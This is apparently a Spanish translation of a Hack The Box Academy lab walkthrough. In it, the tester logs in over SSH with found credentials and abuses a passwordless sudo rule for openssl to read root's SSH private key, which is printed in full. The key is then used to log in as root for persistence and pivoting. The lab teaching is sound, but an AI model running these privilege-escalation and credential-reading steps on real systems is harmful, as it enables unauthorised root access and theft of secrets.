Ahora que hemos trabajado tanto para obtener este punto de apoyo, no queremos perderlo. El objetivo es usar este host como un punto de pivote para acceder al resto de la red interna. Nuestra shell todavía es relativamente inestable y no queremos seguir configurando nuestro acceso con múltiples pasos porque queremos ser lo más eficientes posible y pasar el mayor tiempo posible en la evaluación real, no jugando con shells.

---

## Sinking Our Hooks In

Ahora que tenemos credenciales (`srvadm:ILFreightnixadm!`), podemos aprovechar el puerto SSH que vimos abierto antes y conectarnos para una conexión estable. Esto es importante porque queremos poder volver lo más cerca posible al mismo punto al comienzo de cada día de pruebas, para no tener que perder tiempo en la configuración. Ahora bien, no siempre tendremos SSH abierto a Internet y puede que tengamos que lograr persistencia de otra manera. Podríamos crear un binario de reverse shell en el host, ejecutarlo a través de la command injection, obtener una reverse shell o Meterpreter shell, y luego trabajar a través de eso. Dado que SSH está aquí, lo usaremos. Hay muchas formas de pivotar y tunelizar nuestro tráfico, las cuales fueron cubiertas en profundidad en el módulo [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158), así que vale la pena probar algunas de ellas en esta sección para obtener práctica adicional. Necesitaremos usar algunas de estas a medida que avancemos en esta red. También es bueno tener una forma de respaldo para volver a entrar cuando usamos las credenciales de alguien, ya que pueden darse cuenta de que su cuenta está comprometida o simplemente llega el momento en que se les pide cambiar su contraseña, y no podremos conectarnos al día siguiente. Siempre debemos estar pensando por adelantado, analizando cada ángulo y tratando de anticipar problemas antes de que surjan. Un laboratorio es muy diferente del mundo real, y no hay reinicios ni segundas oportunidades, así que necesitamos trabajar meticulosamente y mantener la conciencia situacional lo mejor posible.

```r
ssh srvadm@10.129.203.111

The authenticity of host '10.129.203.111 (10.129.203.111)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.111' (ECDSA) to the list of known hosts.
srvadm@10.129.203.111's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

 System information as of Tue 21 Jun 2022 07:30:27 PM UTC

 System load:                      0.31
 Usage of /:                       95.8% of 13.72GB
 Memory usage:                     64%
 Swap usage:                       0%
 Processes:                        458
 Users logged in:                  0
 IPv4 address for br-65c448355ed2: 172.18.0.1
 IPv4 address for docker0:         172.17.0.1
 IPv4 address for ens160:          10.129.203.111
 IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
 IPv4 address for ens192:          172.16.8.120

 => / is using 95.8% of 13.72GB

* Super-optimized for small spaces - read how we shrank the memory
  footprint of MicroK8s to make it the smallest full K8s around.

  https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
$ /bin/bash -i
srvadm@dmz01:~
```

Ahora que tenemos una conexión estable a través de SSH, podemos comenzar a enumerar más.

---

## Local Privilege Escalation

Podríamos subir un script de enumeración al sistema como [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), pero siempre intento dos comandos simples después de obtener acceso: `id` para ver si la cuenta comprometida está en algún grupo local privilegiado, y `sudo -l` para ver si la cuenta tiene algún tipo de privilegios `sudo` para ejecutar comandos como otro usuario o como root. A estas alturas, hemos practicado muchas técnicas de escalación de privilegios tanto en los módulos de la Academy como quizás en algunas cajas en la plataforma principal de HTB. Es genial tener estas técnicas en nuestro bolsillo trasero, especialmente si aterrizamos en un sistema muy endurecido. Sin embargo, estamos tratando con administradores humanos, y los humanos cometen errores y también optan por la conveniencia. Más a menudo que no, mi camino para escalar privilegios en una caja Linux durante un pentest no fue algún ataque de wildcard aprovechando tar y un cron job, sino algo simple como `sudo su` sin contraseña para obtener privilegios root o no tener que escalar privilegios porque el servicio que exploté estaba ejecutándose en el contexto de la cuenta root. Todavía es necesario entender y practicar tantas técnicas como sea posible porque, como se ha dicho varias veces, cada entorno es diferente, y queremos tener el kit de herramientas más completo posible a nuestra disposición.

```r
srvadm@dmz01:~$ sudo -l

Matching Defaults entries for srvadm on dmz01:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

Ejecutando `sudo -l`, vemos que podemos ejecutar el comando `/usr/bin/openssl` como root sin necesidad de contraseña. Como sospechábamos, hay un [GTFOBin](https://gtfobins.github.io/gtfobins/openssl/) para el binario OpenSSL. La entrada muestra varias formas en que esto puede ser aprovechado: para subir y descargar archivos, obtener una reverse shell, y leer y escribir archivos. Probemos esto para ver si podemos obtener la clave privada SSH para el usuario root. Esto es ideal en lugar de simplemente intentar leer el archivo `/etc/shadow` u obtener una reverse shell ya que el archivo de clave privada `ida_rsa` nos permitirá SSH de nuevo en el entorno como usuario root, lo cual es perfecto para configurar nuestros pivotes.

La entrada indica que podemos usar el binario para leer archivos privilegiados de la siguiente manera:

```r
LFILE=file_to_read
openssl enc -in "$LFILE"
```

Probemos esto

```r
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

Nota: Si estás trabajando desde el Pwnbox, asegúrate de guardar esta clave privada en tus notas o en un archivo local o tendrás que rehacer todos los pasos para llegar a este punto si decides hacer una pausa por un tiempo.

---

## Establishing Persistence

¡Éxito! Ahora podemos guardar la clave privada en nuestro sistema local, modificar los privilegios y usarla para SSH como root y confirmar privilegios root.

```r
chmod 600 dmz01_key 
ssh -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 21 Jun 2022 07:53:00 PM UTC

  System load:                      0.04
  Usage of /:                       97.1% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        472
  Users logged in:                  1
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 97.1% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 17:50:13 2022
root@dmz01:~# 
```

Funcionó, y estamos dentro y ahora tenemos un "save point" para volver al entorno interno rápidamente y podemos usar este acceso SSH para configurar port forwards y pivotar internamente.